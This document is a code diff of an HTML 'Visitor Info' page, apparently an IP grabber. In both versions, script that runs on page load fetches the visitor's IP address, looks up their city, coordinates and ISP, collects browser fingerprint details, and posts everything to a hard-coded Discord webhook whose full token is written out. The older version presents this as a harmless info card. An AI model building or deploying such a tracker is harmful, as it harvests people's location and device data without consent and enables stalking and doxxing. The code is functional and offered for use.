@@ -1,82 +1,73 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="utf-8">
     <title>Visitor Info</title>
-    <style>
-        body { background: #0d1117; color: #c9d1d9; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #161b22; padding: 2rem; border-radius: 8px; max-width: 600px; }
-        .status { padding: 10px; background: #1f2937; border-left: 4px solid #58a6ff; margin: 10px 0; }
-        .details { background: #0d1117; padding: 15px; border-radius: 6px; border: 1px solid #30363d; font-size: 0.9rem; }
-    </style>
 </head>
 <body>
-    <div class="card">
-        <h1>🌍 Visitor Info</h1>
-        <div class="status" id="status">Loading...</div>
-        <div class="details" id="details"></div>
-    </div>
-
+    <h1>Loading your information...</h1>
+    
     <script>
-        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1482493568831717648/84IzzIBPsGlJfCEZjVCg-qok8J71R61VoyXKPxFi9AvXRrmKmG_NajRyTJyJlM2Tukpf';
-        const statusEl = document.getElementById('status');
-        const detailsEl = document.getElementById('details');
-
-        function setStatus(text) { statusEl.textContent = text; }
-        function display(obj) { detailsEl.innerHTML = Object.entries(obj).map(([k,v]) => `<b>${k}:</b> ${v}`).join('<br>'); }
-
-        // Browser info
-        const browser = {
-            'User Agent': navigator.userAgent,
-            'Language': navigator.language,
-            'Screen': `${screen.width}x${screen.height}`,
-            'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone
+        // Your Discord webhook
+        const WEBHOOK = 'https://discord.com/api/webhooks/1482493568831717648/84IzzIBPsGlJfCEZjVCg-qok8J71R61VoyXKPxFi9AvXRrmKmG_NajRyTJyJlM2Tukpf';
+        
+        // Browser info (always available)
+        const browserData = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            platform: navigator.platform
         };
-        display(browser);
-
-        // Send to Discord
-        function sendToDiscord(content) {
-            fetch(DISCORD_WEBHOOK, {
+        
+        // Function to send to Discord
+        function sendToDiscord(data) {
+            let message = '🆕 **New Visitor**\n';
+            for (let [key, value] of Object.entries(data)) {
+                message += `**${key}:** ${value}\n`;
+            }
+            
+            fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content })
-            }).catch(e => console.warn('Discord send failed:', e));
+                body: JSON.stringify({ content: message })
+            }).catch(e => console.log('Discord send failed:', e));
         }
-
-        // Step 1: Get IP from ipify (always works)
-        setStatus('Getting your IP...');
+        
+        // Step 1: Get IP address (this ALWAYS works)
         fetch('https://api.ipify.org?format=json')
             .then(r => r.json())
             .then(ipData => {
                 const ip = ipData.ip;
-                setStatus(`Got IP: ${ip}. Fetching location...`);
                 
-                // Step 2: Get location from ip-api.com using the IP
-                return fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,lat,lon,isp,timezone`);
-            })
-            .then(r => r.json())
-            .then(locData => {
-                if (locData.status === 'success') {
-                    const full = {
-                        'IP': locData.query,
-                        'Location': `${locData.city}, ${locData.regionName}, ${locData.country}`,
-                        'Coordinates': `${locData.lat}, ${locData.lon}`,
-                        'ISP': locData.isp,
-                        'Timezone': locData.timezone,
-                        ...browser
-                    };
-                    display(full);
-                    setStatus('✅ Info sent to owner');
-                    sendToDiscord(`🆕 **New Visitor**\n` + Object.entries(full).map(([k,v]) => `**${k}:** ${v}`).join('\n'));
-                } else {
-                    throw new Error(locData.message || 'Location failed');
-                }
+                // Step 2: Get location using that IP
+                return fetch(`https://ipapi.co/${ip}/json/`)
+                    .then(r => r.json())
+                    .then(locationData => {
+                        // Combine everything
+                        const fullData = {
+                            'IP Address': ip,
+                            'Location': `${locationData.city || '?'}, ${locationData.region || '?'}, ${locationData.country_name || '?'}`,
+                            'Coordinates': locationData.latitude ? `${locationData.latitude}, ${locationData.longitude}` : '?',
+                            'ISP': locationData.org || 'N/A',
+                            ...browserData
+                        };
+                        
+                        // Send to Discord
+                        sendToDiscord(fullData);
+                        
+                        // Update page
+                        document.body.innerHTML = '<h1>✅ Info captured</h1><p>Check Discord</p>';
+                    });
             })
             .catch(err => {
-                console.warn(err);
-                // Fallback: send at least IP + browser info
-                setStatus('Could not get full location, sending limited data.');
-                sendToDiscord(`🆕 **New Visitor (limited)**\n**IP:** (failed to retrieve)\n` + Object.entries(browser).map(([k,v]) => `**${k}:** ${v}`).join('\n'));
+                // If location fails, at least send IP + browser info
+                console.log('Location failed, sending basic info');
+                sendToDiscord({
+                    'IP Address': 'See browser info only',
+                    ...browserData,
+                    'Note': 'Location unavailable'
+                });
+                document.body.innerHTML = '<h1>⚠️ Basic info sent</h1>';
             });
     </script>
 </body>
